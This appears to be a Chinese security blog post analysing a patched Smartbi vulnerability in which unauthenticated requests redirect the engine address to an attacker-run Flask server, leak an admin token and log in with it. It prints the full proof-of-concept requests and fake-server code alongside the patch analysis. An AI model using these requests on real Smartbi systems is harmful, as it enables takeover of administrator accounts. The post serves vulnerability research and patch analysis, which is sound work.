#  smartbi token回调获取登录凭证漏洞  
 蚁景网安   2026-02-10 08:30  
  
前段时间，Smartbi官方修复了一处权限绕过漏洞。未经授权的攻击者可利用该漏洞，获取管理员token，完全接管管理员权限。于是研究了下相关补丁并进行分析。  
## 0x01分析结果  
  
依据补丁分析，得到如下漏洞复现步骤  
### 第一步，设置EngineAddress为攻击者机器上的http服务地址  
  
首先使用python flask搭建一个fake server，上面只注册了/api/v1/configs/engine/smartbitoken接口，该接口返回一个json响应体  
```
from flask import Flask,jsonify,requestapp = Flask(__name__)@app.route('/api/v1/configs/engine/smartbitoken',methods=["POST"])def hello():    print(request.json)    return jsonify(hi="jello")if __name__ == "__main__":    app.run(host="0.0.0.0",port=8000)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcQNcj4KJnK9ZoRwicezP47C2uWhDlNfw2cGMZqSMOhr4G7NZasEw6X7ItDRqDTlaebNqae7uwIErQ/640?wx_fmt=png "null")  
  
使用如下poc，设置EngineAddress为我们的fake server地址http://10.52.32.43:8000，  
```
POST /smartbi/smartbix/api/monitor/setEngineAddress/ HTTP/1.1Host: 127.0.0.1:18080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeContent-Length: 23http://10.52.32.43:8000
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcQNcj4KJnK9ZoRwicezP47CicpOVr6Kkp9XwveGFjwzArrI2fr5vQqsY5wcYmJjD7lXORquFgHHwUA/640?wx_fmt=png "null")  
### 第二步，触发smartbi向我们刚刚设置的EngineAddress外发token  
  
发送如下请求  
```
POST /smartbi//smartbix/api/monitor/token/ HTTP/1.1Host: 127.0.0.1:18080Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeContent-Length: 10experiment
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcQNcj4KJnK9ZoRwicezP47CQDZ6LyvhXKWCMgfJP8LibAmcFoKvCpIED9qJpIIcv2ZorMGdudPXTbQ/640?wx_fmt=png "null")  
  
发送相关请求后，即可在我们的fake server上面看到了携带token的请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcQNcj4KJnK9ZoRwicezP47CibIFk9FmhxHkMU4Mh8lMfoQ7Iq1WG4HxlR9x4dwuxtNicaGcWQv3GicEg/640?wx_fmt=png "null")  
### 第三步，使用上面获取的token进行登录  
```
POST /smartbi//smartbix/api/monitor/login/ HTTP/1.1Host: 127.0.0.1:18080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeContent-Length: 47admin_I8ac3b2d10189e80fe80fea750189ed0084f50082
```  
  
返回true表示登录成功，其中的cookie就是合法的凭证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcQNcj4KJnK9ZoRwicezP47CWeiarpT7EguIdGRlk5eFGgF5vaibF95XZGYZVmxia5a8Kc1JHdyFnVFwA/640?wx_fmt=png "null")  
## 0x02分析过程  
  
阅读相关补丁，可知此次漏洞与/smartbix/api/monitor/setServiceAddress有关  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcQNcj4KJnK9ZoRwicezP47C3QW0p3HweccgChuDJiajWzoicoXbYUMjYsSFy2ZiaIoljd2S5JXZDIeXQ/640?wx_fmt=png "null")  
  
  
更进一步查看RejectSmartbixSetAddress类修补的方式，可知与smartbix.datamining.service.MonitorService类的getToken方法有关，该补丁表示如果系统中smartbix.datamining.service.MonitorService存在getToken方法就进行拦截/smartbix/api/monitor/setEngineAddress等一系列接口的请求。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcQNcj4KJnK9ZoRwicezP47Czy2jyQ91KJIRyZ1uOkbgUqtpJCUEcShnvR8wtRTXGSjPFcGwhibKrfw/640?wx_fmt=png "null")  
  
分析smartbix.datamining.service.MonitorService类 从头部的注解可知，该类下的所有路由都不需要认证即可访问  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcQNcj4KJnK9ZoRwicezP47Cc3QPV958JDAiaKgcj72IAk7NHjTaze6YcECo0qzmRXBlJicsbkq8ybfg/640?wx_fmt=png "null")  
  
定位到getToken方法 该方法对应的路由的/token,方法内部生成一个token，并在输入的type参数为experiment是将该token发送到系统配置中配置的ENGINE_ADDRESS  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcQNcj4KJnK9ZoRwicezP47CwSzfbCfLokKPiaymWmm53Aic0yKQX1mKbfyD2nVdawjWBzmofnLiaQNsQ/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcQNcj4KJnK9ZoRwicezP47CpEcpib1pSvEek1IVoApucrYDjc54fwaYbkk8cq0odgEXibmetibXfFbkw/640?wx_fmt=png "null")  
  
这意味着，只要ENGINE_ADDRESS可控，那么我们就能获取到一个合法的token由补丁包的路由/smartbix/api/monitor/setServiceAddress定位到setEngineAddress方法 可知该方法可以未授权配置ENGINE_ADDRESS  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcQNcj4KJnK9ZoRwicezP47CDyYiayzNEXW3TjxP29iahovJaKibhlWUCyHjmibRK9aorraWaT7myuttRg/640?wx_fmt=png "null")  
  
那意味着，只需要调用/smartbix/api/monitor/setServiceAddress接口，将ENGINE_ADDRESS设置为我们可控的伪造服务器，那么就可以从请求报文中获取到token。（这个位置经过尝试，发现伪造服务器上需要实现使用POST方法请求的/api/v1/configs/engine/smartbitoken接口，并且，响应内容为json) 获取完token后，就可调用/smartbix/api/monitor/login方法进行登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcQNcj4KJnK9ZoRwicezP47C4HSs2OtpdtiaxWb5PeZno6Fu6KFOQVibeVBAGpKYfoYVCibJ6libkuIgCA/640?wx_fmt=png "null")  
## 0x03其他说明  
  
上述只说明了设置ENGINE_ADDRESS利用的情况，设置SERVICE_ADDRESS进行利用的步骤也和上述类似  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
学  
习  
网安实战课程  
，戳  
“阅读原文”  
  
